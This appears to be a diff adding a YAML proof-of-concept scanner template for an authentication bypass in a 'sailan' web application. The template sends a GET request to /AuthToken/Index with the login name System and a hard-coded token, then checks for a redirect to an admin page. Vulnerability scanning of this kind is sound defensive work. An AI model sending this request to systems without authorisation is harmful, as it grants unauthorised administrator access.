@@ -1,0 +1,20 @@
+name: poc-yaml-sailan-AuthToken_Index-Authentication-bypass
+transport: http
+  
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /AuthToken/Index?loginName=System&token=c94ad0c0aee8b1f23b138484f014131f
+      follow_redirects: false
+      headers:
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+    expression: response.status == 302 && response.body.bcontains(b'/Home6/AdminPretty')
+expression: r0() 
+
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486057&idx=1&sn=5574dd73cf13eb58748b39156bfd5946&chksm=c267bf5af510364c048a1df89e9c5337a91a3bc4a495832290a61be3d588598f331d74222c5d&token=2024266625&lang=zh_CN#rd
